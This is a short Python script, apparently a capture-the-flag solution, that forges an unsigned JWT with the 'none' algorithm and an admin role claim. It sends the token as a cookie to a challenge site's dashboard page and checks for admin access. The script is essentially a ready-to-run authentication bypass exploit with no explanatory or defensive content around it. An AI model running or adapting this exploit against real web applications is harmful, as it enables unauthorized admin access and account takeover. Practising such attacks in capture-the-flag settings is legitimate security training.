import hmac
import hashlib
import base64
import subprocess
import json

# None algorithm 攻击 - 篡改 alg 为 none
header_none = {'alg': 'none', 'typ': 'JWT'}
header_none_b64 = base64.urlsafe_b64encode(json.dumps(header_none, separators=(',', ':')).encode()).decode().rstrip('=')

payload_admin = {'sub': '1', 'role': 'admin', 'exp': 1774706712}
payload_admin_b64 = base64.urlsafe_b64encode(json.dumps(payload_admin, separators=(',', ':')).encode()).decode().rstrip('=')

# None 算法不需要签名，可以是空字符串
jwt_none = f'{header_none_b64}.{payload_admin_b64}.'

print(f'JWT None algorithm attack:')
print(f'Header: {header_none_b64}')
print(f'Payload: {payload_admin_b64}')
print(f'JWT: {jwt_none}')
print()

result = subprocess.run(['curl.exe', '-X', 'GET', 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/dashboard.php',
                        '-H', f'Cookie: token={jwt_none}', '-s'], capture_output=True, text=True)
print('Response:')
print(result.stdout)

if 'admin' in result.stdout.lower():
    print('✅ None algorithm attack SUCCESS!')
